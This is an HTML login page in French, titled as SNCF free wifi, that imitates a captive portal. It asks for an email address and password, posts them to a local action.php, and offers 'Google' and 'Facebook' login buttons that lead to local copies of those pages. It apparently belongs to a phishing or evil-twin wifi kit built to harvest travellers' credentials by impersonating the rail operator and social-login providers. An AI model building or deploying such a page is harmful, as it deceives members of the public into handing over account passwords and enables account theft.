<!doctype html>
<html lang="fr">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="./css/bootstrap.min.css"/>
   	<link rel="stylesheet" href="./css/style.css"/>
		<title>SNCF wifi gratuit</title>
		<link rel="icon" type="image/png" href="ressources/logo.png"/>
		<script type="application/javascript" src="./js/jquery-3.3.1.min.js"></script>
    <script type="application/javascript" src="./js/bootstrap.min.js"></script>
    <script type="application/javascript" src="./js/action.js"></script>
	</head>
	<body>
		<div class="container">
		 <div class="row">
			 <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
				 <div class="card card-signin my-5">
					 <div class="card-body">
						 <div class="text-center">
							 <img src="ressources/logo.png" id="logo" alt="" height="50">
						 </div>
						 <h5 class="card-title text-center">Se connecter</h5>
						 <form class="form-signin" action="action.php" method="post">
							 <div class="form-label-group">
								 <input type="email" id="inputEmail" name="inputEmail" class="form-control" placeholder="Email address" required autofocus>
								 <label for="inputEmail">Adresse email</label>
							 </div>
							 <div class="form-label-group">
								 <input type="password" name="inputPassword" id="inputPassword" class="form-control" placeholder="Password" required>
								 <label for="inputPassword">Mot de passe</label>
							 </div>
							 <div class="custom-control custom-checkbox mb-3">
								 <input type="checkbox" class="custom-control-input" id="customCheck1">
								 <label class="custom-control-label" for="customCheck1">Se souvenir du mot de passe</label>
							 </div>
							 <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Connecter</button>
							 <hr class="my-4">
							 <a href="google.html">
								 <button class="btn btn-lg btn-google btn-block text-uppercase" type="button">
											<img src="ressources/google.png" id="google" class="social" alt="" height="15"/>
										Connexion avec Google
							 		</button>
								</a>
								<a href="facebook.html">
									 <button class="btn btn-lg btn-facebook btn-block text-uppercase" type="button">
										 <img src="ressources/fb.png" class="social" alt="" height="19"/>
										 Connexion avec Facebook</button>
								 </a>
						 </form>
					 </div>
				 </div>
			 </div>
		 </div>
	 </div>
	</body>
</html>
